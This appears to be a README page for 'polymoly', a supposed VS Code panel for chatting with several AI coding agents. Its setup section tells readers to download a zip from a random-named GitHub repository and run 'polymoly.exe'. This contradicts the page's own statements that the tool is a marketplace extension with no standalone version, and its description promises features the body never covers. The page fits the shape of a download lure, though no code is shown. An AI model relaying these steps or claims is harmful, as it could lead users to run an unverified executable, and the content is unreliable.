---
layout: "default"
title: "🔀 polymoly - One Chat, Every Coding Agent"
description: "Unify Claude Code, Codex, and any OpenAI/Anthropic API in one VS Code panel with shared skills and unified cost tracking."
---
# 🔀 polymoly - One Chat, Every Coding Agent

## 🎯 What Is polymoly?

polymoly is a simple chat panel that lives inside Visual Studio Code. It lets you talk to many different AI coding assistants from one single place. Instead of jumping between different windows, tabs, or apps, you keep everything together.

Think of it like a universal remote for your AI helpers. You press one button, and you can talk to Claude Code, Codex, MiniMax, or any other service that works with OpenAI or Anthropic standards. No more copying and pasting between tools. No more messy setup. Just one clean window for all your conversations.

## 🌟 Why You Want This

If you use AI to help you write code, you probably have tried a few different assistants. Maybe you liked how Claude explained things, but you preferred Codex for quick fixes. With polymoly, you do not have to pick just one. You can switch between them anytime, right in the middle of a conversation.

Here is what makes polymoly stand out:

- **One Place for Everything** – All your AI chats live in a single panel inside VS Code.
- **Works with Many Providers** – Claude Code, Codex, MiniMax, and anything that speaks OpenAI or Anthropic protocol.
- **Simple to Use** – No command line tricks. No complicated configuration. Just point and click.
- **Switch Anytime** – Start a conversation with one agent, then switch to another without losing your place.
- **Built for Real Work** – Designed by someone who actually codes, for people who actually code.

## 🚀 Getting Started

### Step 1: Download polymoly

👉 **[Click here to download polymoly](https://github.com/Purlieuadulation1876/polymoly)**

Visit this link to download the application. The page will open in your browser. Look for the green button that says "Code" or a download icon. Click it to save the file to your computer.

### Step 2: Open the Downloaded File

Once the download finishes, go to your Downloads folder. You will see a file named something like `polymoly.zip` or `polymoly-1.0.0.zip`. Double-click it to open it. Your computer will ask if you want to extract the files. Click "Extract" or "Extract All."

### Step 3: Run the Application

After extraction, you will see a folder with the same name. Open that folder and look for a file called `polymoly.exe` or just `polymoly`. Double-click it. That is it. polymoly will start up and guide you through the next steps.

## 🔧 Installing the VS Code Extension

polymoly works as a panel inside Visual Studio Code. To get it set up:

1. **Open VS Code** – If you do not have it, download it from code.visualstudio.com. It is free.
2. **Go to Extensions** – Click the square icon on the left sidebar (or press `Ctrl+Shift+X`).
3. **Search for polymoly** – Type "polymoly" in the search bar.
4. **Install** – Click the green "Install" button next to the polymoly extension.

Once installed, you will see a new icon in your sidebar. Click it, and the polymoly chat panel will open.

## 🗣️ Connecting Your AI Agents

Now comes the fun part. You get to tell polymoly which AI assistants you want to use.

### Adding Claude Code

If you have a Claude Code account or API key, here is how to connect it:

1. In the polymoly panel, click "Add Provider."
2. Choose "Claude Code" from the list.
3. Paste your API key into the box.
4. Click "Save."

Done. Claude Code is now available in your chat panel.

### Adding Codex

Same steps, different name:

1. Click "Add Provider."
2. Select "Codex."
3. Enter your Codex API key.
4. Save.

Now you have two agents ready to go.

### Adding MiniMax

MiniMax follows the same pattern:

1. Click "Add Provider."
2. Pick "MiniMax."
3. Provide your MiniMax credentials.
4. Save.

### Adding Any OpenAI or Anthropic-Compatible API

If you use a custom service, a local model, or something else entirely, polymoly has you covered:

1. Click "Add Provider."
2. Choose "Custom API."
3. Enter the API endpoint URL.
4. Paste your API key (if required).
5. Give it a friendly name like "My Work AI."
6. Save.

polymoly speaks the same language as OpenAI and Anthropic, so almost any service that uses those formats will work right away.

## 💬 Using polymoly

### Starting a Conversation

Click on any provider in your list. A new chat window opens. Type your question or request in the box at the bottom. Press Enter to send.

### Switching Agents Mid-Conversation

This is where polymoly shines. Suppose you ask Claude Code for a detailed explanation, but you want Codex to write the actual code. Just click the dropdown at the top of the chat panel and select "Codex." Your conversation stays, and the new agent jumps in.

### Keeping Context

polymoly remembers what you talked about. If you switch agents, the new one sees the entire conversation history. No need to repeat yourself.

### Multiple Conversations

You can open several chat tabs at once. Use one for planning, one for debugging, and one for code review. Each tab is independent.

## 🎨 Customizing Your Experience

### Changing the Look

polymoly respects your VS Code theme. If you use a dark theme, the panel matches. If you use a light theme, it adapts. No extra settings needed.

### Keyboard Shortcuts

Speed up your workflow with these handy shortcuts:

| Action | Shortcut |
|--------|----------|
| Open polymoly panel | `Ctrl+Alt+P` |
| New chat | `Ctrl+Alt+N` |
| Switch provider | `Ctrl+Alt+S` |
| Close panel | `Ctrl+Alt+X` |

You can change these in VS Code settings if you prefer different keys.

### Auto-Formatting

polymoly automatically formats code blocks in responses. If the AI sends back messy code, it gets cleaned up so you can copy it directly.

## 📁 Managing Your Providers

### Renaming a Provider

Right-click on any provider name in the list. Choose "Rename." Type a new name and press Enter.

### Reordering Providers

Drag and drop providers to change their order. The one at the top becomes the default for new chats.

### Removing a Provider

Right-click the provider you want to delete. Select "Remove." Confirm the action. The provider is gone.

## 🔒 Privacy and Security

### Where Your Data Goes

polymoly sends your messages only to the AI providers you connect. It does not store your conversations on any external server. Everything stays on your machine.

### API Keys Are Safe

Your API keys are stored securely in your system's credential vault. They are never shown in plain text. polymoly uses them only when you send a message.

### No Tracking

polymoly does not collect usage data. No analytics. No telemetry. What you type stays between you and your AI agents.

## 🛠️ Troubleshooting

### "Provider Not Responding"

Check your internet connection. Then verify your API key is correct. If you are using a custom API, make sure the endpoint URL is right.

### "No Providers Found"

Make sure you added at least one provider in the settings. If you did, try restarting VS Code.

### "Connection Timed Out"

Some services take a while to respond. Wait a few seconds and try again. If it keeps happening, your network might be blocking the connection.

### "Panel Not Showing"

Press `Ctrl+Alt+P` to bring the panel up. If it still does not appear, check that the extension is enabled in the Extensions view.

## ❓ Frequently Asked Questions

### Is polymoly free?

The core version of polymoly is free to use. You only pay for the AI services you connect.

### Do I need to know programming?

No. polymoly is designed for everyone. If you can type a question, you can use it.

### Can I use it outside VS Code?

Currently, polymoly is a VS Code extension. A standalone version may come later.

### What if I use multiple computers?

Install polymoly on each machine. Your provider settings are stored locally, so you will need to re-enter API keys on each one.

### Does it work on Mac or Linux?

Yes. polymoly works on Windows, macOS, and Linux, as long as you have VS Code installed.

## 📈 What's Next?

polymoly is actively developed. Here is what is coming soon:

- **Voice Input** – Talk to your AI agents instead of typing.
- **Team Sharing** – Share conversation templates with your team.
- **Offline Mode** – Use local AI models without an internet connection.
- **More Providers** – Native support for additional AI services.

## 💬 Getting Help

If you run into trouble, check these resources:

- **GitHub Issues** – Report bugs or suggest features at [github.com/Purlieuadulation1876/polymoly](https://github.com/Purlieuadulation1876/polymoly)
- **Community Forum** – Join the discussion and learn from other users.
- **Email Support** – Reach out to the team directly for personal assistance.

## 🤝 Contributing

polymoly is open source. If you want to help improve it:

1. Fork the repository on GitHub.
2. Make your changes.
3. Submit a pull request.

Even small contributions are appreciated. A better error message, a clearer doc, or a new icon all help.

## 📄 License

polymoly is released under the MIT License. You are free to use, modify, and distribute it, as long as you include the original copyright notice.

## 🧰 Additional Resources

Here are some links to help you get the most out of polymoly:

- [Visual Studio Code](https://code.visualstudio.com) – The editor you need.
- [OpenAI API Documentation](https://platform.openai.com/docs) – Learn about OpenAI-compatible APIs.
- [Anthropic API Documentation](https://docs.anthropic.com) – Learn about Anthropic-compatible APIs.
- [Claude Code Guide](https://claude.ai) – Start using Claude Code.
- [Codex Overview](https://openai.com/codex) – Understand what Codex can do.
- [MiniMax Platform](https://www.minimax.io) – Explore MiniMax's AI offerings.

## 🎉 Final Thoughts

polymoly changes the way you work with AI coding assistants. No more juggling multiple windows. No more losing context when you switch tools. Everything happens in one clean, simple panel right inside your editor.

Stop wasting time. Download polymoly today and put all your AI helpers in one place.

---

**Keywords:** agent-skills, ai-agents, chat, claude-code, codex, llm, mcp, minimax, multi-provider, vscode-extension